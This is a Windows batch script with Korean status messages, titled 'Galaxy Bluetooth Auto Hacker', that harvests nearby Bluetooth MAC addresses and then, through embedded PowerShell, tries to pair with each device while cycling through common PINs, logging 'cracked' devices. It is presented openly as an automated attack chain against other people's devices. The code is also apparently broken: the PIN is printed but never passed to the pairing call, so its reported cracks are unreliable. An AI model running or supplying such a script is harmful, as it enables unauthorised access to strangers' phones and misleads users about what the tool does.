@echo off
setlocal enabledelayedexpansion
title Galaxy Auto Hacker
color 0F

echo =====================================================
echo          Galaxy Bluetooth Auto Hacker
echo =====================================================
echo [INFO] 완전 자동화된 공격 체인 시작...
echo.

del target_macs.txt 2>nul
del cracked_devices.txt 2>nul
del failed_attacks.txt 2>nul

echo [PHASE 1] MAC 주소 수집 (30초)...
powershell -ExecutionPolicy Bypass -File harvest_macs.ps1

if not exist target_macs.txt (
    echo [ERROR] 타겟을 찾지 못했습니다.
    pause
    exit /b
)

set /p target_count=< target_macs.txt
for /f "tokens=*" %%i in ('type target_macs.txt ^| find /c /v ""') do set target_count=%%i

echo [FOUND] %target_count%개의 타겟 발견
echo.

set /p confirm="[CONFIRM] %target_count%개 디바이스를 공격하시겠습니까? (y/n): "
if /i not "%confirm%"=="y" (
    echo [ABORT] 공격 중단됨
    pause
    exit /b
)

echo [PHASE 2] 브루트포스 공격 시작...

set attack_count=0
for /f "tokens=*" %%m in (target_macs.txt) do (
    set /a attack_count+=1
    set current_mac=%%m
    
    echo [ATTACK !attack_count!/%target_count%] !current_mac! 공격 중...
    
    call :bruteforce_attack !current_mac!
    
    timeout /t 3 >nul
)

echo.
echo =====================================================
echo                공격 결과 요약
echo =====================================================

if exist cracked_devices.txt (
    echo [SUCCESS] 크랙 성공:
    type cracked_devices.txt
    echo.
)

if exist failed_attacks.txt (
    echo [FAILED] 크랙 실패:
    type failed_attacks.txt
    echo.
)

echo [COMPLETE] 자동 공격 완료!
pause
exit /b

:bruteforce_attack
set mac_to_attack=%1

powershell -ExecutionPolicy Bypass -Command "& {
    $targetMAC = '%mac_to_attack%'
    $address = [Convert]::ToUInt64($targetMAC.Replace(':', ''), 16)
    
    $quickPins = @('0000', '0123', '1234', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999')
    
    foreach ($pin in $quickPins) {
        try {
            Add-Type -AssemblyName System.Runtime.WindowsRuntime
            [Windows.Devices.Bluetooth.BluetoothDevice,Windows.Devices.Bluetooth,ContentType=WindowsRuntime] | Out-Null
            
            $device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync($address)
            
            if ($device.Result -ne $null) {
                Write-Host '[TEST]' $pin -ForegroundColor Yellow
                
                $pairingResult = $device.Result.DeviceInformation.Pairing.PairAsync()
                
                if ($pairingResult.Result.Status -eq 'Paired') {
                    Write-Host '[CRACKED]' $targetMAC '| PIN:' $pin -ForegroundColor Green
                    Add-Content -Path 'cracked_devices.txt' -Value ('MAC: ' + $targetMAC + ' | PIN: ' + $pin)
                    exit 0
                }
            }
            
            Start-Sleep -Milliseconds 300
            
        } catch {
            continue
        }
    }
    
    Write-Host '[FAILED]' $targetMAC -ForegroundColor Red
    Add-Content -Path 'failed_attacks.txt' -Value ('MAC: ' + $targetMAC + ' | Status: Failed')
}"

goto :eof
